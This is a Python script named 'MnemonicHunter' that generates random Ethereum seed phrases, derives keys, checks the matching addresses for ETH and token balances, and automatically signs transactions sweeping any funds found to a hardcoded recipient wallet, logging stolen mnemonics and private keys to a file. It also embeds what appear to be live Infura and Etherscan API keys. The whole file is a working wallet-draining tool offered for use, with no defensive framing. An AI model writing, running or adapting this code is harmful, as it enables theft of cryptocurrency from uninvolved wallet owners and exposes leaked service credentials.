import concurrent.futures
import requests
from web3 import Web3, HTTPProvider
from eth_account import Account
from mnemonic import Mnemonic
from datetime import datetime
import logging
import sys
import time
import secrets
from typing import Optional, List, Tuple

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('mnemonic_hunter.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Configuration
INFURA_URLS = ["https://mainnet.infura.io/v3/1e398ffe7b4b4bfdadf597e0bf40bee8"]  # Add more for rotation
TO_ADDRESS = "0x0d5F915f1fA947fA28Df6DE4d448115D3D87738c"  # Your wallet
ETHERSCAN_API_KEY = "N7RR32X8HUWQH9N6GJMTV4441RB5XUARAE"  # Free at https://etherscan.io/apis
GAS_LIMIT = 21000  # ETH transfer
BATCH_SIZE = 50  # Parallel batch
SCAN_DURATION = 3600  # 1 hour, adjust as needed
RETRY_COUNT = 3  # Network retries
WORKERS = 4  # Parallel threads
MNEMONIC_STRENGTH = 128  # 12 words (256 for 24 words)

# Initialize Web3 pool
web3_pool = [Web3(HTTPProvider(url)) for url in INFURA_URLS]
for w3 in web3_pool:
    if not w3.is_connected():
        logger.error(f"❌ Failed to connect to Infura: {url}")
        sys.exit(1)

# Initialize mnemonic generator
mnemo = Mnemonic("english")

def get_gas_price() -> int:
    """Fetch dynamic gas price from Etherscan."""
    for _ in range(RETRY_COUNT):
        try:
            response = requests.get(
                f"https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={ETHERSCAN_API_KEY}"
            )
            data = response.json()
            if data["status"] == "1":
                return Web3.to_wei(int(data["result"]["FastGasPrice"]), 'gwei')
            return Web3.to_wei(20, 'gwei')  # Fallback
        except Exception as e:
            logger.error(f"Gas fetch attempt failed: {e}")
            time.sleep(1)
    return Web3.to_wei(20, 'gwei')

def generate_mnemonic() -> str:
    """Generate a random BIP-39 mnemonic."""
    return mnemo.generate(strength=MNEMONIC_STRENGTH)

def mnemonic_to_private_key(mnemonic: str, path: str = "m/44'/60'/0'/0/0") -> Optional[str]:
    """Derive private key from mnemonic."""
    try:
        seed = mnemo.to_seed(mnemonic)
        account = Account.from_mnemonic(mnemonic, account_path=path)
        return account._private_key.hex()
    except Exception:
        return None

def private_key_to_address(pk_hex: str) -> Optional[str]:
    """Convert private key to address."""
    try:
        account = Account.from_key(pk_hex)
        return account.address
    except Exception:
        return None

def check_balances(address: str, w3: Web3) -> Tuple[float, bool]:
    """Check ETH and ERC-20 balances."""
    for _ in range(RETRY_COUNT):
        try:
            eth_balance = Web3.from_wei(w3.eth.get_balance(address), 'ether')
            erc20_balance = 0.0
            response = requests.get(
                f"https://api.etherscan.io/api?module=account&action=tokenbalancehistory&address={address}&page=1&offset=10&apikey={ETHERSCAN_API_KEY}"
            )
            data = response.json()
            if data["status"] == "1" and data["result"]:
                erc20_balance = sum(
                    Web3.from_wei(int(token["balance"]), 'ether') for token in data["result"]
                )
            total = eth_balance + erc20_balance
            return total, total > 0
        except Exception as e:
            logger.error(f"Balance check failed for {address}: {e}")
            time.sleep(1)
    return 0.0, False

def sweep_funds(pk_hex: str, from_address: str, w3: Web3) -> bool:
    """Sweep ETH to TO_ADDRESS."""
    try:
        account = Account.from_key(pk_hex)
        if account.address.lower() != from_address.lower():
            logger.error(f"Key {pk_hex[:8]}... does NOT match {from_address}")
            return False

        total_balance, has_funds = check_balances(from_address, w3)
        if not has_funds:
            logger.warning(f"No funds in {from_address}")
            return False

        gas_price = get_gas_price()
        eth_balance = w3.eth.get_balance(from_address)
        gas_cost = gas_price * GAS_LIMIT

        if eth_balance > gas_cost:
            nonce = w3.eth.get_transaction_count(from_address)
            tx = {
                'nonce': nonce,
                'to': TO_ADDRESS,
                'value': eth_balance - gas_cost,
                'gas': GAS_LIMIT,
                'gasPrice': gas_price,
                'chainId': 1
            }
            signed_tx = w3.eth.account.sign_transaction(tx, pk_hex)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            logger.info(f"Sweeping {total_balance:.10f} (ETH+ERC20) from {from_address}")
            logger.info(f"Tx hash: {tx_hash.hex()} | Check: https://etherscan.io/tx/{tx_hash.hex()}")

            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            if receipt.status == 1:
                logger.info(f"Success! Swept {total_balance:.10f} to {TO_ADDRESS}")
                return True
            logger.error(f"Sweep failed: {receipt}")
        return False

    except Exception as e:
        logger.error(f"Error sweeping {from_address}: {e}")
        return False

def scan_worker(mnemonics: List[str], w3: Web3) -> List[Tuple[str, str, str, float]]:
    """Process a batch of mnemonics."""
    hits = []
    for mnemonic in mnemonics:
        pk_hex = mnemonic_to_private_key(mnemonic)
        if not pk_hex:
            continue
        address = private_key_to_address(pk_hex)
        if not address:
            continue
        total_balance, has_funds = check_balances(address, w3)
        if has_funds:
            hits.append((mnemonic, pk_hex, address, total_balance))
            logger.info(f"[FOUND] Address: {address} | Balance: {total_balance:.10f} | Mnemonic: {mnemonic}")
            with open("hits.txt", "a") as f:
                f.write(f"[{datetime.utcnow()}] Address: {address} | Balance: {total_balance:.10f} | Mnemonic: {mnemonic} | Key: {pk_hex}\n")
        time.sleep(0.05)  # Micro-delay
    return hits

def mnemonic_hunter():
    """Scan and sweep mnemonic-derived wallets."""
    logger.info("Starting MnemonicHunter")
    start_time = time.time()

    while time.time() - start_time < SCAN_DURATION:
        # Generate mnemonics
        mnemonics = [generate_mnemonic() for _ in range(BATCH_SIZE)]

        # Parallel scanning
        hits = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
            mnemonic_batches = [mnemonics[i::WORKERS] for i in range(WORKERS)]
            futures = [executor.submit(scan_worker, batch, web3_pool[i % len(web3_pool)]) for i, batch in enumerate(mnemonic_batches)]
            for future in concurrent.futures.as_completed(futures):
                hits.extend(future.result())

        # Sweep hits
        for mnemonic, pk_hex, address, balance in hits:
            if sweep_funds(pk_hex, address, web3_pool[0]):
                logger.info(f"Swept {balance:.10f} from {address} (Mnemonic: {mnemonic})")
            else:
                logger.error(f"Failed to sweep {address}")

        time.sleep(0.1)  # Batch delay

    logger.info("MnemonicHunter stopped.")

if __name__ == "__main__":
    try:
        mnemonic_hunter()
    except KeyboardInterrupt:
        logger.info("MnemonicHunter stopped by user.")
        sys.exit(0)
